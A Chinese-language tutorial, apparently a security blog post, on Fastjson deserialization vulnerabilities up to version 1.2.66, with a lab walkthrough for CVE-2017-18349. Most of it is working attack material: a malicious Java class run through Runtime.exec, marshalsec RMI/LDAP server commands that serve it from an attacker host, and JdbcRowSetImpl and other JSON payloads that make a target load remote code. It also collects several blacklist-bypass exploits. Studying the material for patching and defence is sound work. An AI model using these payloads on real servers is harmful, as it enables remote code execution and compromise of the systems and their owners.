+++
title = "Fastjson系列漏洞"
+++

## 前置

### Fastjson 是什么

Fastjson 是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。

```java
public static void main(String[] args) {
        // 将一个 Java 对象序列化为 JSON 字符串
        Person person = new Person("Alice", 18);
        String jsonString = JSON.toJSONString(person);
        System.out.println(jsonString);

        // 将一个 JSON 字符串反序列化为 Java 对象
        String jsonString2 = "{\"user_name\":\"Bob\",\"user_age\":20}";
        Person person2 = JSON.parseObject(jsonString2, Person.class);
        System.out.println(person2.getName() + ", " + person2.getAge());
    }



public static class Person {
        @JSONField(name = "user_name")
        private String name;
        @JSONField(name = "user_age")
        private int age;

```

如果类中属性名和字符串中属性名相同，可以直接通过 **[CLASS name].class** 来进行转换 ，否则需要 **@JSONField(name = "user_age")** 进行映射

在fastjson中，默认情况下，生成的JSON字符串的顺序是按照**属性的字母顺序**进行排序的，而不是按照属性在类中的声明顺序。

可以通过在类中使用 **@JSONType**注解来设置属性的序列化顺序

```Java
    // 定义一个简单的 Java 类
    @JSONType(orders = {"name", "age"})
    public static class Person {
        private String name;
        private int age;

        public Person(String name, int age) {
            this.name = name;
            this.age = age;
        }

        public String getName() {
            return name;
        }

        public void setName(String name) {
            this.name = name;
        }

        public int getAge() {
            return age;
        }

        public void setAge(int age) {
            this.age = age;
        }
    }
}
```

### @type是什么

@type是fastjson中的一个特殊注解，用于标识JSON字符串中的某个属性是一个Java对象的类型。具体来说，当fastjson从JSON字符串反序列化为Java对象时，如果JSON字符串中包含@type属性，fastjson会根据该属性的值来确定反序列化后的Java对象的类型。

```java
package org.example;
import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {
        String json = "{\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\",\"@type\":\"java.lang.Runtime\"}"; //在包含多个相同键（如@type）的JSON对象中，只有最后一个键值对会生效。
        ParserConfig.getGlobalInstance().addAccept("java.lang"); //这行代码配置了fastjson解析器，允许其解析属于java.lang包中的类。否则fastjson在1.2.24之后默认禁用Autotype
        Runtime runtime = (Runtime) JSON.parseObject(json, Object.class);
        runtime.exec("calc.exe");
    }
}
```

在这个例子中，JSON字符串包含"@type":"java.lang.Runtime"，表示将这个JSON对象反序列化为java.lang.Runtime类型的对象。

## 漏洞

### 方式

1.反序列化常用的两种利用方式，一种是基于rmi，一种是基于ldap。

2.RMI是一种行为，指的是Java远程方法调用。

3.JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找到相关的对象，并把它下载到客户端中来。

4.ldap指轻量级目录服务协议。

### 限制

基于rmi的利用方式：适用jdk版本：JDK 6u132，JDK 7u131，JDK 8u121之前；

在jdk8u122的时候，加了反序列化白名单的机制，关闭了rmi远程加载代码。

基于ldap的利用方式，适用jdk版本：JDK 11.0.1、8u191、7u201、6u211之前。

在Java 8u191更新中，Oracle对LDAP向量设置了相同的限制，并发布了CVE-2018-3149，关闭了JNDI远程类加载。

可以看到ldap的利用范围是比rmi要大的，实战情况下推荐使用ldap方法进行利用。

### fastjson < 1.2.25反序列化导致任意命令执行漏洞（CVE-2017-18349）

#### 影响版本

- Fastjson < 1.2.25

#### 原理

FastJson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。

漏洞利用fastjson autotype在处理json对象的时候，未对@type字段进行完全的安全性验证，攻击者可以传入危险类，并调用危险类连接远程rmi主机，通过其中的恶意类执行代码。

1.检测漏洞
在kali上执行下面这条命令，使用 curl命令模拟json格式的POST请求，返回json格式的请求结果，没报404，正常情况下说明存在该漏洞。

```bash
curl http://192.168.9.234:8090/ -H "Content-Type: application/json" --data '{"name":"zcc", "age":18}'
```

2.编写恶意类代码，用于提供给靶机使用

```java
import java.lang.Runtime;
import java.lang.Process;
public class zcc{
 static {
 try {
 Runtime rt = Runtime.getRuntime();
 String[] commands = {"touch", "/tmp/zcctest"};
 Process pc = rt.exec(commands);
 pc.waitFor();
 } catch (Exception e) {
 // do nothing
 }
 }
}
```

3.搭建http服务传输恶意文件

```bash
python -m SimpleHTTPServer 80
```

4.开启rmi或者ldap服务

借助marshalsec项目，启动一个RMI服务器，监听9999端口，这里的ip为你上面开启http服务的ip，我们这里就是kali的ip:

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://192.168.10.65/#zcc" 9999
```

这里如果要启动LDAP服务的话，只需把上面命令中的RMI改成LDAP即可，例如：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://192.168.10.65/#zcc" 9999
```

5.利用  

使用BP抓包，并写入poc(记住请求包里面请求方式改成post，Content-Type改成application/json)：

```json
{
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://192.168.10.65:9999/zcc",
 "autoCommit":true
 }
}
```

即可成功利用,在/tmp/zcctest中有相应文件

### Fastjson 1.2.47远程命令执行漏洞

#### 漏洞原理

fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。

只需要将利用的POC改为

```json
{
 "a":{
 "@type":"java.lang.Class",
 "val":"com.sun.rowset.JdbcRowSetImpl"
 },
 "b":{
 "@type":"com.sun.rowset.JdbcRowSetImpl",
 "dataSourceName":"rmi://192.168.10.65:9999/zcc",
 "autoCommit":true
 }
}
```

即可顺利执行

### fastjson<=1.2.41漏洞详情

第一个Fastjson反序列化漏洞爆出后，阿里在1.2.25版本设置了autoTypeSupport属性默认为false，并且增加了checkAutoType()函数，通过黑白名单的方式来防御Fastjson反序列化漏洞，因此后面发现的Fastjson反序列化漏洞都是针对黑名单绕过来实现攻击利用的目的的。com.sun.rowset.jdbcRowSetlmpl在1.2.25版本被加入了黑名单，fastjson有个判断条件判断类名是否以"L"开头、以";"结尾，是的话就提取出其中的类名在加载进来，因此在原类名头部加L，尾部加;即可绕过黑名单的同时加载类。

exp：

```json
{           
 "@type":"Lcom.sun.rowset.JdbcRowSetImpl;",
 "dataSourceName":"rmi://x.x.x.x:9999/rce_1_2_24_exploit",
 "autoCommit":true
}
```

autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

### 2.4 fastjson<=1.2.42漏洞详情

fastjson在1.2.42版本新增了校验机制。如果输入类名的开头和结尾是L和;就将头尾去掉再进行黑名单校验。绕过方法：在类名外部嵌套两层L和;。

原类名：com.sun.rowset.JdbcRowSetImpl

绕过：LLcom.sun.rowset.JdbcRowSetImpl;;

exp：

```json
{           
 "@type":"LLcom.sun.rowset.JdbcRowSetImpl;;",
 "dataSourceName":"rmi://x.x.x.x:9999/exp",
 "autoCommit":true
}
```

autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

### 2.5 fastjson<=1.2.45漏洞详情

前提条件：目标服务器存在mybatis的jar包，且版本需为3.x.x系列<3.5.0的版本。

使用黑名单绕过，org.apache.ibatis.datasource在1.2.46版本被加入了黑名单。

autoTypeSupport属性为true才能使用。（fastjson>=1.2.25默认为false）

exp：

```json
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"ldap://localhost:1389/Exploit"}}
```

### 2.6 fastjson<=1.2.47漏洞详情

对版本小于1.2.48的版本通杀，autoType为关闭状态也可用。loadClass中默认cache为true，利用分2步，首先使用java.lang.Class把获取到的类缓存到mapping中，然后直接从缓存中获取到了com.sun.rowset.jdbcRowSetlmpl这个类，绕过了黑名单机制。

exp：

```json
{
 "a": {
 "@type": "java.lang.Class", 
 "val": "com.sun.rowset.JdbcRowSetImpl"
 }, 
 "b": {
 "@type": "com.sun.rowset.JdbcRowSetImpl", 
 "dataSourceName": "rmi://x.x.x.x:9999/exp", 
 "autoCommit": true
 }
}
```

### 2.7 fastjson<=1.2.62漏洞详情

基于黑名单绕过exp：

```json
{"@type":"org.apache.xbean.propertyeditor.JndiConverter","AsText":"rmi://x.x.x.x:9999/exploit"}";
```

### 2.8 fastjson<=1.2.66漏洞详情

也是基于黑名单绕过，autoTypeSupport属性为true才能使用，（fastjson>=1.2.25默认为false）以下是几个exp：

```json
{"@type":"org.apache.shiro.jndi.JndiObjectFactory","resourceName":"ldap://192.168.80.1:1389/Calc"}
{"@type":"br.com.anteros.dbcp.AnterosDBCPConfig","metricRegistry":"ldap://192.168.80.1:1389/Calc"}
{"@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup","jndiNames":"ldap://192.168.80.1:1389/Calc"}
{"@type":"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig","properties": {"@type":"java.util.Properties","UserTransacti
on":"ldap://192.168.80.1:1389/Calc"}}

```
